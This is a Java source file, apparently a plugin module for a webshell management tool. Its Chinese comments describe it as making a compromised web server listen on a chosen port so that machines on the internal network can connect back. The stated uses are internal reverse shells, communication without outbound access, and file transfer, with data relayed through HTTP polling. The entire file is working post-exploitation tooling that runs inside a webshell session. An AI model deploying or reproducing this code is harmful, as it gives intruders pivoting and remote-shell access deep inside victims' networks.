import java.io.ByteArrayOutputStream;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

/**
 * 反连端口类 - 在webshell端监听端口，等待内网机器反连
 * 
 * 工作原理：
 * 1. 客户端指定要在webshell端监听的端口
 * 2. webshell在该端口上启动监听
 * 3. 内网机器连接到webshell的监听端口
 * 4. 客户端通过HTTP轮询获取反连数据
 * 5. 客户端可以发送数据到反连的内网机器
 * 
 * 用途：
 * - 内网机器反弹shell
 * - 不出网环境下的内网通信
 * - 反向文件传输等
 */
public class ReverseConnect {
    private HashMap parameterMap;
    
    public static String extraData;
    public static Object Session;
    
    // 静态存储：listenId -> 监听器信息
    private static Map<String, ServerSocketChannel> activeListeners = new ConcurrentHashMap<>();
    private static Map<String, String> listenerPorts = new ConcurrentHashMap<>();
    
    // 静态存储：connectionId -> 反连连接信息
    private static Map<String, SocketChannel> activeConnections = new ConcurrentHashMap<>();
    private static Map<String, String> connectionSources = new ConcurrentHashMap<>();
    private static Map<String, String> connectionListeners = new ConcurrentHashMap<>();

    public ReverseConnect() {
    }

    public boolean equals(Object paramObject) {
        try {
            this.parameterMap = (HashMap)paramObject;
            this.Session = this.parameterMap.get("httpSession");
        } catch (Exception e) {
            return false;
        }
        return true;
    }
    
    public String toString() {
        this.parameterMap.put("result", this.run().getBytes());
        this.parameterMap = null;
        return null;
    }
    
    /**
     * 主入口方法，根据methodName分发到具体功能
     */
    public String run() {
        String methodName = this.get("methodName");
        try {
            if (methodName == null) {
                return "error:methodName is null";
            }
            
            if (methodName.equals("startListener")) {
                String result = this.startListener();
                return result;
            } else if (methodName.equals("stopListener")) {
                this.stopListener();
                return "ok";
            } else if (methodName.equals("checkConnections")) {
                return this.checkNewConnections();
            } else if (methodName.equals("readConnection")) {
                byte[] data = this.readConnectionData();
                if (data != null) {
                    return "ok" + base64encode(data);
                } else {
                    return "error:no data or connection closed";
                }
            } else if (methodName.equals("writeConnection")) {
                this.writeConnectionData();
                return "ok";
            } else if (methodName.equals("closeConnection")) {
                this.closeConnection();
                return "ok";
            } else if (methodName.equals("getStatus")) {
                return this.getStatus();
            } else if (methodName.equals("clearAll")) {
                this.clearAll();
                return "ok";
            } else {
                return "error:methodName not supported: " + methodName;
            }
        } catch (Exception e) {
            return "error:" + e.getMessage();
        }
    }

    /**
     * 启动端口监听
     * 参数：
     * - listenId: 监听器标识符（唯一）
     * - listenPort: 监听端口
     */
    public String startListener() throws Exception {
        String listenId = this.get("listenId");
        String listenPort = this.get("listenPort");
        
        if (listenId == null || listenPort == null) {
            throw new Exception("listenId or listenPort is null");
        }
        
        int port = Integer.parseInt(listenPort);
        if (port <= 0 || port > 65535) {
            throw new Exception("Invalid listen port number: " + port);
        }
        
        // 检查监听器是否已存在
        if (activeListeners.containsKey(listenId)) {
            ServerSocketChannel existing = activeListeners.get(listenId);
            try {
                existing.close();
            } catch (Exception e) {
                // 忽略关闭异常
            }
            activeListeners.remove(listenId);
            listenerPorts.remove(listenId);
        }
        
        // 创建监听器
        ServerSocketChannel serverChannel = ServerSocketChannel.open();
        serverChannel.configureBlocking(false); // 非阻塞模式
        serverChannel.socket().setReuseAddress(true);
        serverChannel.bind(new InetSocketAddress(port));
        
        // 存储监听器信息
        activeListeners.put(listenId, serverChannel);
        listenerPorts.put(listenId, String.valueOf(port));
        
        return "ok:listener_started:" + listenId + " on port " + port;
    }

    /**
     * 停止端口监听
     */
    public void stopListener() throws Exception {
        String listenId = this.get("listenId");
        
        if (listenId == null) {
            throw new Exception("listenId is null");
        }
        
        ServerSocketChannel serverChannel = activeListeners.get(listenId);
        if (serverChannel != null) {
            try {
                serverChannel.close();
            } catch (Exception e) {
                // 忽略关闭异常
            }
            activeListeners.remove(listenId);
            listenerPorts.remove(listenId);
        }
        
        // 关闭该监听器的所有连接
        for (String connectionId : activeConnections.keySet()) {
            String connListenerId = connectionListeners.get(connectionId);
            if (listenId.equals(connListenerId)) {
                SocketChannel conn = activeConnections.get(connectionId);
                try {
                    conn.close();
                } catch (Exception e) {
                    // 忽略
                }
                activeConnections.remove(connectionId);
                connectionSources.remove(connectionId);
                connectionListeners.remove(connectionId);
            }
        }
    }

    /**
     * 检查新的反连连接
     */
    public String checkNewConnections() throws Exception {
        String listenId = this.get("listenId");
        
        if (listenId == null) {
            throw new Exception("listenId is null");
        }
        
        ServerSocketChannel serverChannel = activeListeners.get(listenId);
        if (serverChannel == null) {
            throw new Exception("Listener not found: " + listenId);
        }
        
        StringBuilder result = new StringBuilder();
        result.append("ok:");
        
        try {
            // 检查是否有新连接（非阻塞）
            SocketChannel clientChannel = serverChannel.accept();
            if (clientChannel != null) {
                // 有新连接
                clientChannel.configureBlocking(false);
                clientChannel.socket().setKeepAlive(true);
                clientChannel.socket().setTcpNoDelay(true);
                
                // 生成连接ID
                String connectionId = listenId + "_conn_" + System.currentTimeMillis();
                String clientAddr = clientChannel.getRemoteAddress().toString();
                
                // 存储连接信息
                activeConnections.put(connectionId, clientChannel);
                connectionSources.put(connectionId, clientAddr);
                connectionListeners.put(connectionId, listenId);
                
                result.append("NEW_CONNECTION:").append(connectionId)
                      .append(":").append(clientAddr);
            } else {
                result.append("NO_NEW_CONNECTION");
            }
        } catch (Exception e) {
            result.append("ERROR:").append(e.getMessage());
        }
        
        return result.toString();
    }

    /**
     * 从反连连接读取数据
     */
    public byte[] readConnectionData() throws Exception {
        String connectionId = this.get("connectionId");
        
        if (connectionId == null) {
            throw new Exception("connectionId is null");
        }
        
        SocketChannel clientChannel = activeConnections.get(connectionId);
        if (clientChannel == null) {
            throw new Exception("Connection not found: " + connectionId);
        }
        
        if (!clientChannel.isConnected()) {
            activeConnections.remove(connectionId);
            connectionSources.remove(connectionId);
            connectionListeners.remove(connectionId);
            throw new Exception("Connection closed: " + connectionId);
        }
        
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            ByteBuffer buffer = ByteBuffer.allocate(8192);
            int totalBytesRead = 0;
            boolean hasReadData = false;
            
            // 尝试读取数据，最多尝试30次
            for (int attempt = 0; attempt < 30; attempt++) {
                buffer.clear();
                int length = clientChannel.read(buffer);
                
                if (length > 0) {
                    hasReadData = true;
                    byte[] data = Arrays.copyOfRange(buffer.array(), 0, length);
                    bos.write(data);
                    totalBytesRead += length;
                    
                    // 继续读取直到没有更多数据
                    while (true) {
                        buffer.clear();
                        int moreLength = clientChannel.read(buffer);
                        if (moreLength > 0) {
                            byte[] moreData = Arrays.copyOfRange(buffer.array(), 0, moreLength);
                            bos.write(moreData);
                            totalBytesRead += moreLength;
                        } else if (moreLength == 0) {
                            // 没有更多数据
                            break;
                        } else {
                            // 连接关闭 (length == -1)
                            return bos.toByteArray();
                        }
                    }
                    
                    // 如果读取到数据，短暂等待看是否还有更多数据
                    try {
                        Thread.sleep(3);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                    
                } else if (length == 0) {
                    // 暂时没有数据
                    if (hasReadData) {
                        // 如果已经有数据，等待一下看是否有更多
                        try {
                            Thread.sleep(5);
                        } catch (InterruptedException e) {
                            Thread.currentThread().interrupt();
                            break;
                        }
                    } else {
                        // 还没有数据，短暂等待
                        try {
                            Thread.sleep(3);
                        } catch (InterruptedException e) {
                            Thread.currentThread().interrupt();
                            break;
                        }
                    }
                } else {
                    // length == -1，连接关闭
                    if (totalBytesRead > 0) {
                        return bos.toByteArray();
                    } else {
                        activeConnections.remove(connectionId);
                        connectionSources.remove(connectionId);
                        connectionListeners.remove(connectionId);
                        throw new Exception("Connection closed by peer: " + connectionId);
                    }
                }
            }
            
            // 返回读取到的数据（可能为空）
            return bos.toByteArray();
            
        } finally {
            try {
                bos.close();
            } catch (Exception e) {
                // 忽略
            }
        }
    }

    /**
     * 向反连连接写入数据
     */
    public void writeConnectionData() throws Exception {
        String connectionId = this.get("connectionId");
        String data = this.get("extraData");
        
        if (connectionId == null || data == null) {
            throw new Exception("connectionId or extraData is null");
        }
        
        SocketChannel clientChannel = activeConnections.get(connectionId);
        if (clientChannel == null || !clientChannel.isConnected()) {
            throw new Exception("Connection not found or disconnected: " + connectionId);
        }
        
        byte[] dataBytes = this.base64decode(data);
        ByteBuffer buffer = ByteBuffer.allocate(dataBytes.length);
        buffer.put(dataBytes);
        buffer.flip();
        
        while (buffer.hasRemaining()) {
            int written = clientChannel.write(buffer);
            if (written == 0) {
                // 避免无限循环
                Thread.sleep(1);
            }
        }
    }

    /**
     * 关闭指定的反连连接
     */
    public void closeConnection() throws Exception {
        String connectionId = this.get("connectionId");
        
        if (connectionId == null) {
            throw new Exception("connectionId is null");
        }
        
        SocketChannel clientChannel = activeConnections.get(connectionId);
        if (clientChannel != null) {
            try {
                clientChannel.close();
            } catch (Exception e) {
                // 忽略关闭异常
            }
            activeConnections.remove(connectionId);
            connectionSources.remove(connectionId);
            connectionListeners.remove(connectionId);
        }
    }

    /**
     * 获取状态信息
     */
    public String getStatus() {
        StringBuilder status = new StringBuilder();
        status.append("ok:");
        status.append("ACTIVE_LISTENERS:").append(activeListeners.size()).append("|");
        status.append("ACTIVE_CONNECTIONS:").append(activeConnections.size()).append("|");
        
        // 监听器状态
        for (String listenId : activeListeners.keySet()) {
            ServerSocketChannel listener = activeListeners.get(listenId);
            String port = listenerPorts.get(listenId);
            boolean bound = listener != null && listener.socket().isBound();
            status.append("LISTENER_").append(listenId).append(":").append(port)
                  .append(":").append(bound).append("|");
        }
        
        // 连接状态
        for (String connectionId : activeConnections.keySet()) {
            SocketChannel conn = activeConnections.get(connectionId);
            String source = connectionSources.get(connectionId);
            String listenerId = connectionListeners.get(connectionId);
            boolean connected = conn != null && conn.isConnected();
            status.append("CONNECTION_").append(connectionId).append(":").append(source)
                  .append(":").append(listenerId).append(":").append(connected).append("|");
        }
        
        return status.toString();
    }

    /**
     * 清除所有监听器和连接
     */
    public void clearAll() {
        // 关闭所有连接
        for (SocketChannel conn : activeConnections.values()) {
            try {
                conn.close();
            } catch (Exception e) {
                // 忽略
            }
        }
        activeConnections.clear();
        connectionSources.clear();
        connectionListeners.clear();
        
        // 关闭所有监听器
        for (ServerSocketChannel listener : activeListeners.values()) {
            try {
                listener.close();
            } catch (Exception e) {
                // 忽略
            }
        }
        activeListeners.clear();
        listenerPorts.clear();
    }

    /**
     * 从参数映射中获取字符串值
     */
    public String get(String key) {
        Object value = this.parameterMap.get(key);
        if (value == null) {
            return null;
        }
        if (value instanceof String) {
            return (String) value;
        }
        if (value instanceof byte[]) {
            try {
                return new String((byte[]) value, "UTF-8");
            } catch (Exception e) {
                return null;
            }
        }
        return value.toString();
    }

    /**
     * Base64解码
     */
    private byte[] base64decode(String text) throws Exception {
        String version = System.getProperty("java.version");
        byte[] result = null;
        try {
            if (version.compareTo("1.8") >= 0) {
                Class<?> Base64Class = Class.forName("java.util.Base64");
                Object decoder = Base64Class.getMethod("getDecoder", null).invoke(Base64Class, null);
                result = (byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, text);
            } else {
                Class<?> Base64Class = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = Base64Class.newInstance();
                result = (byte[])decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, text);
            }
        } catch (Exception e) {
            throw new Exception("Base64 decode failed: " + e.getMessage());
        }
        return result;
    }

    /**
     * Base64编码
     */
    private static String base64encode(byte[] content) throws Exception {
        String result = "";
        String version = System.getProperty("java.version");
        if (version.compareTo("1.8") >= 0) {
            Class<?> Base64Class = Class.forName("java.util.Base64");
            Object encoder = Base64Class.getMethod("getEncoder", null).invoke(Base64Class, null);
            result = (String)encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, new Object[]{content});
        } else {
            Class<?> Base64Class = Class.forName("sun.misc.BASE64Encoder");
            Object encoder = Base64Class.newInstance();
            result = (String)encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, new Object[]{content});
            result = result.replace("\n", "").replace("\r", "");
        }
        return result;
    }
}




